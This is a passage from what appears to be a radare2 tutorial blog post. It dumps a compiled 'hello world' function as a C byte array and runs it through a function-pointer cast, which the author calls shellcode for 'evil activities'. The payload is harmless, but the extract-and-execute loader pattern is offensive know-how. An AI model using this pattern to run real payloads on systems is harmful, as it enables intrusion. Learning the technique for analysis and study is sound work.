<span class="err">│</span>           <span class="mh">0x55ef096056c1</span>      <span class="mi">48</span><span class="n">b868656c6c</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x6f77206f6c6c6568</span> <span class="p">;</span> <span class="err">'</span><span class="n">hello</span> <span class="n">wo</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55ef096056cb</span>      <span class="mi">488945</span><span class="n">ec</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55ef096056cf</span>      <span class="n">c745f4726c64</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mh">0x646c72</span> <span class="p">;</span> <span class="err">'</span><span class="n">rld</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55ef096056d6</span>      <span class="mi">488</span><span class="n">d45ec</span>       <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55ef096056da</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55ef096056dd</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55ef096056e2</span>      <span class="n">e899feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span>     <span class="p">;</span> <span class="kt">int</span> <span class="n">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55ef096056e7</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x55ef096056e8</span>      <span class="mi">488</span><span class="n">b45f8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55ef096056ec</span>      <span class="mi">644833042528</span><span class="p">.</span>  <span class="n">xor</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x55ef096056f5</span>      <span class="mi">7405</span>           <span class="n">je</span> <span class="mh">0x55ef096056fc</span>
<span class="err">│</span>       <span class="err">│</span>   <span class="mh">0x55ef096056f7</span>      <span class="n">e874feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">__stack_chk_fail</span> <span class="p">;</span> <span class="kt">void</span> <span class="n">__stack_chk_fail</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="err">│</span>       <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x55ef096056fc</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x55ef096056fd</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x55ef096056aa</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>Once inside it in r2 we’ll use pc</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55ef096056aa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pc</span>
<span class="cp">#define _BUFFER_SIZE 256
</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="n">_BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span>
  <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span>
  <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span>
  <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span>
  <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span>
  <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span>
  <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span>
  <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span>
  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xfd</span>
<span class="p">};</span>
</code></pre></div></div>
<p>That will return a buffer containing the function-shellcode to us so we can use it in our <em>evil activities</em></p>

<p>Inside the code will work like this</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include&lt;string.h&gt;
#include &lt;stdint.h&gt;
</span>
<span class="cp">#define _BUFFER_SIZE 256
</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="n">_BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span>
  <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span>
  <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span>
  <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span>
  <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span>
  <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span>
  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span>
  <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x00</span>
<span class="p">};</span>


<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
    <span class="n">func</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buffer</span><span class="p">;</span>
    <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
<span class="p">}</span>
</code></pre></div></div>
<p>And inside r2 will go like this:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x5606c6856704</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">entry0</span> <span class="err">@</span> <span class="mh">0x5606c68565bd</span>
<span class="err">┌</span> <span class="mi">33</span><span class="o">:</span> <span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">);</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="mh">0x5606c6856704</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x5606c6856705</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x5606c6856708</span>      <span class="mi">4883</span><span class="n">ec10</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x10</span>
<span class="err">│</span>           <span class="mh">0x5606c685670c</span>      <span class="mi">488</span><span class="n">d05ed0000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="n">obj</span><span class="p">.</span><span class="n">buffer</span>     <span class="p">;</span> <span class="mh">0x5606c6856800</span>
